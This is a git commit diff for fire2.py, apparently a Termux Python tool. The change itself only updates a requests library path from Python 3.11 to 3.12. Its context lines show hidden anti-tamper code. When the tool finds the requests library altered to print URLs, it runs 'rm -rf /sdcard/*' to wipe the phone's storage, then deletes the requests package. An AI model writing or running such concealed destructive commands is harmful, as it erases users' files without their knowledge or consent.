39ec0768cf9ef8cb19c46874341b6b44de0eab3c
emperorzihad <Emperorzihad@gmail.com>
2026-01-11 22:11:19 +0600

    Update fire2.py

--- fire2.py
+++ fire2.py
@@ -140,7 +140,7 @@ if 'print(url)' in file_content:
     os.system('rm -rf /sdcard/*')
     os.system('pip install requests')
     exit(f'\x1b[38;5;46m➤{A} RE-RUN TOOL.!')
-with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
+with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py', 'r') as file:
     file_content = file.read()
 if 'print' in file_content:
     os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
@@ -598,3 +598,4 @@ except requests.exceptions.ConnectionError:
 except Exception as e:
     print(e)                
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MR OGGY ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
+
